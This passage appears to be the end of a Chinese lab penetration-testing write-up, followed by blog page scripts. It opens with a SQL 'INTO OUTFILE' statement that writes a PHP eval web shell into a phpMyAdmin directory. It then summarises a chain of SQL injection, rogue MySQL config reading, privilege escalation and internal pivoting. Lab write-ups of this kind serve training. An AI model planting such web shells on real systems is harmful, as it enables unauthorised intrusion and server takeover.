+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">&#x27;&lt;?php eval($_POST[cmd]);?&gt;&#x27;</span> <span class="keyword">into</span> outfile <span class="string">&#x27;/www/wdlinux/wdcp/phpmyadmin/mac.php&#x27;</span>;</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-13%2003.18.56.png" alt="截屏2022-07-13 03.18.56"></p>
+<h2 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h2><p>整个靶场全面地展示了 Linux 内网渗透，通过对站点源码进行代码审计，发现 DocCMS 存在诸多漏洞，首先是SQL注入漏洞，但是拿到的密文无法解密，其次是后台建设脚本<code>setup.php</code>使用参数传递 MySQL 配置信息来导入数据，我们可搭建伪造的 MySQL 服务器用于后台脚本连接并成功读取网站配置文件，利用配置中的账号密码成功登录数据库，覆盖后台管理员密码哈希，因此可直接登录后台。后台存在模板编辑，通过该功能成功拿到用户权限。权限提升的道路也不简单，需要绕过PHP的<code>diabled_functions</code>才能执行命令，存在三条路径能够成功提权root用户，一是suid提权，二是 sudo提权，三是宝塔面板提权。拿到外网服务器的root权限后进入内网渗透环节，通过建立代理访问内网主机，访问其对应的 ddd5 域名，利用弱口令进入后台，发现模板处存在文件上传，使用菜刀设置代理连接木马，成功拿到内网主机权限，当然在内网主机中还发现了WDCP主机管理系统，进入该系统下载生成的SSH密钥，最终成功登录内网主机的root权限。该靶场非常贴近实战，十分适合网络安全进阶人员练习，在实战渗透时能够提供给我们非常好的借鉴作用。 </p>
+
+
+<div class="article-footer reveal fs14"><section id="license"><div class="header"><span>License</span></div><div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
+</div></section></div>
+
+</article>
+
+<div class="related-wrap reveal" id="read-next"><section class="header cap theme"><span>READ NEXT</span></section><section class="body fs14"><a id="next" href="/post/26b8dca/">UploadLabs通关手册<span class="note">Older</span></a><div class="line"></div></section></div>
+
+
+
+
+
+
+  <div class='related-wrap md reveal' id="comments">
+    <div class='cmt-title cap theme'>
+      Join the discussion
+    </div>
+    <div class='cmt-body valine'>
+      
+
+<div id="valine_container" class="valine_thread"><svg class="loading" style="vertical-align: middle;fill: currentColor;overflow: hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2709"><path d="M832 512c0-176-144-320-320-320V128c211.2 0 384 172.8 384 384h-64zM192 512c0 176 144 320 320 320v64C300.8 896 128 723.2 128 512h64z" p-id="2710"></path></svg></div>
+
+    </div>
+  </div>
+
+
+
+      
+<footer class="page-footer reveal fs12"><hr><div class="text"><p>All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</p>
+<p>This site was deployed by <a href="https://toxic80l.github.io/">@toxic80L</a> using <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.6.1" title="v1.6.1">Stellar</a>.</p>
+</div></footer>
+
+      <div class='float-panel mobile-only blur' style='display:none'>
+  <button type='button' class='sidebar-toggle mobile' onclick='sidebar.toggle()'>
+    <svg class="icon" style="width: 1em; height: 1em;vertical-align: middle;fill: currentColor;overflow: hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="15301"><path d="M566.407 808.3c26.9-0.1 49.3-20.8 51.6-47.6-1.9-27.7-23.9-49.7-51.6-51.6h-412.6c-28.2-1.4-52.6 19.5-55.5 47.6 2.3 26.8 24.6 47.5 51.6 47.6h416.5v4z m309.3-249.9c26.9-0.1 49.3-20.8 51.6-47.6-2.2-26.8-24.6-47.5-51.6-47.6h-721.9c-27.7-2.8-52.5 17.4-55.3 45.1-0.1 0.8-0.1 1.7-0.2 2.5 0.9 27.2 23.6 48.5 50.7 47.6H875.707z m-103.1-245.9c26.9-0.1 49.3-20.8 51.6-47.6-0.4-28.3-23.2-51.1-51.5-51.6h-618.9c-29.5-1.1-54.3 21.9-55.5 51.4v0.2c1.4 27.8 25.2 49.2 53 47.8 0.8 0 1.7-0.1 2.5-0.2h618.8z" p-id="15302"></path><path d="M566.407 808.3c26.9-0.1 49.3-20.8 51.6-47.6-1.9-27.7-23.9-49.7-51.6-51.6h-412.6c-28.2-1.4-52.6 19.5-55.5 47.6 1.9 27.7 23.9 49.7 51.6 51.6h416.5z m309.3-249.9c26.9-0.1 49.3-20.8 51.6-47.6-2.2-26.8-24.6-47.5-51.6-47.6h-721.9c-27.7-2.8-52.5 17.4-55.3 45.1-0.1 0.8-0.1 1.7-0.2 2.5 0.9 27.2 23.6 48.5 50.7 47.6H875.707z m-103.1-245.9c26.9-0.1 49.3-20.8 51.6-47.6-0.4-28.3-23.2-51.1-51.5-51.6h-618.9c-29.5-1.1-54.3 21.9-55.5 51.4v0.2c1.4 27.8 25.2 49.2 53 47.8 0.8 0 1.7-0.1 2.5-0.2h618.8z" p-id="15303"></path></svg>
+  </button>
+</div>
+
+    </div>
+  </div>
+  <div class='scripts'>
+    <script type="text/javascript">
+  stellar = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    loadCSS: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    // 从 butterfly 和 volantis 获得灵感
+    loadScript: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    // https://github.com/jerryc127/hexo-theme-butterfly
+    jQuery: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        stellar.loadScript(stellar.plugins.jQuery).then(fn)
+      } else {
+        fn()
+      }
+    }
+  };
+  stellar.github = 'https://github.com/xaoxuu/hexo-theme-stellar/tree/1.6.1';
+  stellar.config = {
+    date_suffix: {
+      just: 'Just',
+      min: 'minutes ago',
+      hour: 'hours ago',
+      day: 'days ago',
+      month: 'months ago',
+    },
+  };
+
+  // required plugins (only load if needs)
+  stellar.plugins = {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js',
+    sitesjs: '/js/plugins/sites.js',
+    friendsjs: '/js/plugins/friends.js',
+  };
+
+  // optional plugins
+  if ('true' == 'true') {
+    stellar.plugins.lazyload = Object.assign({"enable":true,"js":"https://cdn.jsdelivr.net/npm/vanilla-lazyload@17.3.1/dist/lazyload.min.js","transition":"blur"});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.swiper = Object.assign({"enable":true,"css":"https://unpkg.com/swiper@6/swiper-bundle.min.css","js":"https://unpkg.com/swiper@6/swiper-bundle.min.js"});
+  }
+  if ('' == 'true') {
+    stellar.plugins.scrollreveal = Object.assign({"enable":null,"js":"https://cdn.jsdelivr.net/npm/scrollreveal@4.0.9/dist/scrollreveal.min.js","distance":"8px","duration":500,"interval":100,"scale":1});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.preload = Object.assign({"enable":true,"service":"flying_pages","instant_page":"https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@4.1.2/js/instant_page.js","flying_pages":"https://cdn.jsdelivr.net/gh/gijo-varghese/flying-pages@2.1.2/flying-pages.min.js"});
+  }
+</script>
+
+<!-- required -->
+
+  
+<script src="/js/main.js" async></script>
+
+
+
+<!-- optional -->
+
+  <script>
+  function getEmojiMaps() {
+    function emoji(path, idx, ext) {
+      return path + "/" + path + "-" + idx + "." + ext;
+    }
+    var emojiMaps = {};
+    for (var i = 1; i <= 54; i++) {
+      emojiMaps['tieba-' + i] = emoji('tieba', i, 'png');
+    }
+    for (var i = 1; i <= 101; i++) {
+      emojiMaps['qq-' + i] = emoji('qq', i, 'gif');
+    }
+    for (var i = 1; i <= 116; i++) {
+      emojiMaps['aru-' + i] = emoji('aru', i, 'gif');
+    }
+    for (var i = 1; i <= 125; i++) {
+      emojiMaps['twemoji-' + i] = emoji('twemoji', i, 'png');
+    }
+    for (var i = 1; i <= 4; i++) {
+      emojiMaps['weibo-' + i] = emoji('weibo', i, 'png');
+    }
+    return emojiMaps;
+  }
+  function load_comment(){
+    if(!document.getElementById("valine_container"))return;
+    stellar.loadScript('https://cdn.jsdelivr.net/gh/XuxuGood/simple-blog-cdn@main/js/Valine.min.js', {defer:true}).then(function () {
+      const el = document.getElementById("valine_container");
+      var path = el.getAttribute('comment_id');
+      const placeholder = "";
+      if (!path) {
+        path = decodeURI(window.location.pathname);
+      }
+      var valine = new Valine();
+      valine.init(Object.assign({"js":"https://cdn.jsdelivr.net/gh/XuxuGood/simple-blog-cdn@main/js/Valine.min.js","appId":"5eo9cV9bsvMnta4gOnhxtdKF-gzGzoHsz","appKey":"LwEPyca9biyGVsDzHA7WfAjH","placeholder":null,"requiredFields":["nick","mail"],"enableQQ":true,"recordIP":false,"avatar":"robohash","pageSize":10,"lang":"zh-cn","highlight":true,"mathJax":false,"tagMeta":["博主","小伙伴","访客"],"metaPlaceholder":{"nick":"昵称/QQ号(必填)","mail":"邮箱（必填，完全保密）","link":"网址(https://)"},"master":["6783037F2DF30EAB99F9FC256157D875"],"friends":["6783037F2DF30EAB99F9FC256157D875"]}, {
+        el: '#valine_container',
+        path: path,
+        placeholder: placeholder,
+        emojiCDN: 'https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/valine/',
+        emojiMaps: getEmojiMaps(),
+      }));
+    });
+  }
+  window.addEventListener('DOMContentLoaded', (event) => {
+    console.log('DOM fully loaded and parsed');
+    load_comment();
+  });
+
+</script>
+
+
+
+
+<!-- inject -->
+
+
+  </div>
+</body>
+</html>
